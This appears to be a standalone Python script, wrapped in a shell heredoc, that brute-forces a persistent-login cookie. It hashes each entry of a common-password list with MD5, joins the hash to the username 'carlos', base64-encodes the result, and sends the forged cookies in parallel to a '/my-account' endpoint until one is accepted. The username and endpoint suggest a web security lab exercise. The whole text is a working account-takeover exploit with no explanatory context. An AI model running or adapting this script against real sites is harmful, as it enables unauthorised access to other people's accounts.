python3 - <<'EOF'
import requests
import base64
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed

base_url = "URL"

passwords = ["123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor","monitoring","montana","moon","moscow"]

def try_password(password):
    # Build the cookie
    md5hash = hashlib.md5(password.encode()).hexdigest()
    cookie_value = base64.b64encode(f"carlos:{md5hash}".encode()).decode()
    
    # Try it
    r = requests.get(
        f"{base_url}/my-account?id=[VICTIM-USERNAME]",
        cookies={"stay-logged-in": cookie_value},
        allow_redirects=False
    )
    
    if r.status_code == 200 and "Your username is" in r.text:
        return f"[FOUND] password: {password} | cookie: {cookie_value}"
    return None

with ThreadPoolExecutor(max_workers=10) as ex:
    futures = {ex.submit(try_password, p): p for p in passwords}
    for f in as_completed(futures):
        result = f.result()
        if result:
            print(result)
EOF
